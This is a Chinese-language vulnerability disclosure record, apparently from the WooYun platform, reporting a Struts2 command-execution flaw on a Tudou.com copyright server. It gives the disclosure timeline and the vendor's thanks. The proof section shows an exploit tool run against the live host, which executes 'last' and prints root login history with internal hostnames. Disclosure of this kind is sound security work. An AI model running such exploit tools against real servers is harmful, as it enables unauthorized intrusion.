wybug_title: 土豆网某处服务器存在Str2命令执行
wybug_detail:
漏洞详情 披露状态：   									2014-01-27：	细节已通知厂商并且等待厂商处理中									2014-01-31：	厂商已经确认，细节仅向厂商公开									2014-02-10：	细节向核心白帽子及相关领域专家公开									2014-02-20：	细节向普通白帽子公开									2014-03-02：	细节向实习白帽子公开									2014-03-13：	细节向公众公开  简要描述： 土豆网某处服务器存在Str2命令执行 详细说明：  土豆网某处服务器存在Str2命令执行http://copyright.tudou.com/cpmanage/system/admin-login   漏洞证明：  


$ ./xwork copyright.tudou.com last[+] Now try to exploit the copyright.tudou.com[1] http://copyright.tudou.com/cpfront/frontagentuser/login[2] http://copyright.tudou.com/cpfront/frontagentuser/user-regist[3] http://copyright.tudou.com/cpfront/frontagentuser/user-regist[+] Find 2 URLs[+] Stop scan , found the vulnerability [ http://copyright.tudou.com/cpfront/frontagentuser/login ] !!![+] The target OS is unix [*] Now Exploit it !!-----------------------------------root     pts/1        manage1.hgh.tudo Fri Jan 17 10:16 - 10:16  (00:00)    root     pts/1        manage2.hgh.tudo Wed Jan 15 11:01 - 11:36  (00:34)    root     pts/1        manage2.hgh.tudo Wed Jan 15 10:01 - 10:04  (00:03)    root     pts/1        manage2.hgh.tudo Wed Jan 15 09:59 - 09:59  (00:00)    root     pts/2        manage1.hgh.tudo Wed Jan 15 09:54 - 09:58  (00:03)    root     pts/1        manage1.hgh.tudo Wed Jan 15 09:53 - 09:59  (00:05)    root     pts/1        manage1.hgh.tudo Wed Jan 15 08:49 - 08:50  (00:01)    root     pts/1        manage1.hgh.tudo Tue Jan 14 09:12 - 09:13  (00:00)    root     pts/1        manage1.hgh.tudo Wed Jan  8 17:35 - 17:39  (00:03)    toodou   pts/4        manage3.hgh.tudo Wed Jan  8 16:41 - 16:41  (00:00)

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-01-31 10:33 厂商回复： 多谢，已处理。祝马年身体健康！马到功成！马上有钱！ 最新状态： 暂无
